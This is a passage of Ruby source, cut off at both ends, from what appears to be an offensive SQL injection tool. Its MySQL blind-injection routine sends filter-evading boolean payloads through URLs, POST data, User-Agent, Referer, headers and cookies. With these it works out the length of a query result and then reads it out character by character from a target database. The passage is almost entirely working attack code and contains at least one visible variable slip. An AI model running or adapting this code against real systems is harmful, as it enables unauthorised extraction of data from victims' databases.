        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end
      if res[0] == @true
        print_error("Result Length < 0?")
        print_error("Bogus Result Encountered!")
        @fail=true
        return nil
      end

      inj = " aNd (SeLeCT leNgTh((#{query}))>1000000)"
      t = @tweak.tamper(inj)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end
      if res[0] == @true
        print_error("Result Length > 1,000,000?")
        print_error("Result Length Too Great to Attempt to Return!")
        @fail=true
        return nil
      end

      if not @fail
        baselength=10
        # Find the proper range, within 10 of the length
        while(true)
          inj = " aNd (SeLeCT leNgTh((#{query}))<#{baselength})"
          t = @tweak.tamper(inj)
          t2 = @tweak.space(t)
          injection_str = @tweak.comma(t2)
          case $config['INJECTOR']['MYSQL']['LOC']
          when 'URL'
            if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
              injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.get(injection)
            else # POST
              injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.post(injection_url, injection_data)
            end
          when 'UA'
            original_ua = $config['HTTP']['HTTP_USER_AGENT']
            $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['HTTP_USER_AGENT'] = original_ua
          when 'REF'
            original_ref = $config['HTTP']['REFERER']
            $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['REFERER'] = original_ref
          when 'HEADER'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          when 'COOKIE'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          end
          if res[0] == @true
#           baselength = baselength.to_i - 10
            if baselength.to_i < 100
              baselength = baselength.to_i - 10
            elsif baselength.to_i > 100 and baselength.to_i < 1000
              baselength = baselength.to_i - 50
            elsif baselength.to_i > 1000 and baselength.to_i < 1000000
              baselength = baselength.to_i - 100
            end
            break
          else
            if baselength.to_i < 100
              baselength = baselength.to_i + 10
            elsif baselength.to_i > 100 and baselength.to_i < 1000
              zcount = zcount.to_i + 50
            elsif baselength.to_i > 1000 and baselength.to_i < 1000000
              baselength = baselength.to_i + 100
            else
              print_error("Result Length > 1,000,000?")
              print_error("Result Length Too Great to Attempt to Return!")
              @fail=true
              return nil
            end
#           baselength = baselength.to_i + 10
          end
        end

        # Try to cut in half
        inj = " aNd (SeLeCT leNgTh((#{query}))<#{(baselength.to_i / 2)})"
        t = @tweak.tamper(inj)
        t2 = @tweak.space(t)
        injection_str = @tweak.comma(t2)
        case $config['INJECTOR']['MYSQL']['LOC']
        when 'URL'
          if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
            injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.get(injection)
          else # POST
            injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.post(injection_url, injection_data)
          end
        when 'UA'
          original_ua = $config['HTTP']['HTTP_USER_AGENT']
          $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['HTTP_USER_AGENT'] = original_ua
        when 'REF'
          original_ref = $config['HTTP']['REFERER']
          $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['REFERER'] = original_ref
        when 'HEADER'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        when 'COOKIE'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        end
        if res[0] == @true
          zcount = (baselength + 15)
          baselength = (baselength.to_i / 2) # Cut in half
        else
          zcount = (baselength + 25) # more padding
        end

        # Now narrow it down to the real length
        while true
          inj = " aNd (SeLeCT leNgTh((#{query}))=#{baselength})"
          t = @tweak.tamper(inj)
          t2 = @tweak.space(t)
          injection_str = @tweak.comma(t2)
          case $config['INJECTOR']['MYSQL']['LOC']
          when 'URL'
            if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
              injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.get(injection)
            else # POST
              injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.post(injection_url, injection_data)
            end
          when 'UA'
            original_ua = $config['HTTP']['HTTP_USER_AGENT']
            $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['HTTP_USER_AGENT'] = original_ua
          when 'REF'
            original_ref = $config['HTTP']['REFERER']
            $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['REFERER'] = original_ref
          when 'HEADER'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          when 'COOKIE'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          end
          if res[0] == @true
            break
          else
            baselength = baselength.to_i + 1
          end
          if baselength.to_i > zcount.to_i
            print_error("Unable to properly determine result length!")
            baselength = baselength.to_i - 1
            break
          end
        end

        # Now we go get the actual result!
        reallength = baselength.to_i + 1
        char_position = 1
        results = String.new
        while char_position.to_i < reallength.to_i
          inj = " aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<51)"
          t = @tweak.tamper(inj)
          t2 = @tweak.space(t)
          injection_str = @tweak.comma(t2)
          case $config['INJECTOR']['MYSQL']['LOC']
          when 'URL'
            if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
              injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.get(injection)
            else # POST
              injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.post(injection_url, injection_data)
            end
          when 'UA'
            original_ua = $config['HTTP']['HTTP_USER_AGENT']
            $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['HTTP_USER_AGENT'] = original_ua
          when 'REF'
            original_ref = $config['HTTP']['REFERER']
            $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['REFERER'] = original_ref
          when 'HEADER'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          when 'COOKIE'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          end
          if res[0] == @true
            starts = 0
            ends = 51
          else
            inj = " aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<101)"
            t = @tweak.tamper(inj)
            t2 = @tweak.space(t)
            injection_str = @tweak.comma(t2)
            case $config['INJECTOR']['MYSQL']['LOC']
            when 'URL'
              if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
                injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                res = @http.get(injection)
              else # POST
                injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
                res = @http.post(injection_url, injection_data)
              end
            when 'UA'
              original_ua = $config['HTTP']['HTTP_USER_AGENT']
              $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              $config['HTTP']['HTTP_USER_AGENT'] = original_ua
            when 'REF'
              original_ref = $config['HTTP']['REFERER']
              $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              $config['HTTP']['REFERER'] = original_ref
            when 'HEADER'
              if not $config['HTTP']['HTTP_HEADERS_ADD']
                turn_off=true
                $config['HTTP']['HTTP_HEADERS_ADD'] = true
              end
              $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
              end
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              if turn_off
                $config['HTTP']['HTTP_HEADERS_ADD'] = false
              end
              $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].delete(k)
              end
            when 'COOKIE'
              if not $config['HTTP']['HTTP_HEADERS_ADD']
                turn_off=true
                $config['HTTP']['HTTP_HEADERS_ADD'] = true
              end
              $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
              end
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              if turn_off
                $config['HTTP']['HTTP_HEADERS_ADD'] = false
              end
              $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].delete(k)
              end
            end
            if res[0] == @true
              starts = 50
              ends = 101
            else
              inj = " aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<151)"
              t=@tweak.tamper(inj)
              t2=@tweak.space(t)
              injection_str = @tweak.comma(t2)
              case $config['INJECTOR']['MYSQL']['LOC']
              when 'URL'
                if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
                  injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                  res = @http.get(injection)
                else # POST
                  injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                  injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
                  res = @http.post(injection_url, injection_data)
                end
              when 'UA'
                original_ua = $config['HTTP']['HTTP_USER_AGENT']
                $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
                if $config['INJECTOR']['MYSQL']['DATA'].nil?
                  res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                else
                  res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                end
                $config['HTTP']['HTTP_USER_AGENT'] = original_ua
              when 'REF'
                original_ref = $config['HTTP']['REFERER']
                $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
                if $config['INJECTOR']['MYSQL']['DATA'].nil?
                  res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                else
                  res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                end
                $config['HTTP']['REFERER'] = original_ref
              when 'HEADER'
                if not $config['HTTP']['HTTP_HEADERS_ADD']
                  turn_off=true
                  $config['HTTP']['HTTP_HEADERS_ADD'] = true
                end
                $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                  $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
                end
                if $config['INJECTOR']['MYSQL']['DATA'].nil?
                  res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                else
                  res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                end
                if turn_off
                  $config['HTTP']['HTTP_HEADERS_ADD'] = false
                end
                $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                  $config['HTTP']['HTTP_HEADERS'].delete(k)
                end
              when 'COOKIE'
                if not $config['HTTP']['HTTP_HEADERS_ADD']
                  turn_off=true
                  $config['HTTP']['HTTP_HEADERS_ADD'] = true
                end
                $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
                  $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
                end
                if $config['INJECTOR']['MYSQL']['DATA'].nil?
                  res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                else
                  res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                end
                if turn_off
                  $config['HTTP']['HTTP_HEADERS_ADD'] = false
                end
                $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                  $config['HTTP']['HTTP_HEADERS'].delete(k)
                end
              end
              if res[0] == @true
                starts = 100
                ends = 151
              else
                inj = " aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<201)"
                t = @tweak.tamper(inj)
                t2 = @tweak.space(t)
                injection_str = @tweak.comma(t2)
                case $config['INJECTOR']['MYSQL']['LOC']
                when 'URL'
                  if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
                    injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                    res = @http.get(injection)
                  else # POST
                    injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                    injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
                    res = @http.post(injection_url, injection_data)
                  end
                when 'UA'
                  original_ua = $config['HTTP']['HTTP_USER_AGENT']
                  $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
                  if $config['INJECTOR']['MYSQL']['DATA'].nil?
                    res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                  else
                    res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                  end
                  $config['HTTP']['HTTP_USER_AGENT'] = original_ua
                when 'REF'
                  original_ref = $config['HTTP']['REFERER']
                  $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
                  if $config['INJECTOR']['MYSQL']['DATA'].nil?
                    res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                  else
                    res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                  end
                  $config['HTTP']['REFERER'] = original_ref
                when 'HEADER'
                  if not $config['HTTP']['HTTP_HEADERS_ADD']
                    turn_off=true
                    $config['HTTP']['HTTP_HEADERS_ADD'] = true
                  end
                  $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                    $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
                  end
                  if $config['INJECTOR']['MYSQL']['DATA'].nil?
                    res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                  else
                    res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                  end
                  if turn_off
                    $config['HTTP']['HTTP_HEADERS_ADD'] = false
                  end
                  $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                    $config['HTTP']['HTTP_HEADERS'].delete(k)
                  end
                when 'COOKIE'
                  if not $config['HTTP']['HTTP_HEADERS_ADD']
                    turn_off=true
                    $config['HTTP']['HTTP_HEADERS_ADD'] = true
                  end
                  $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
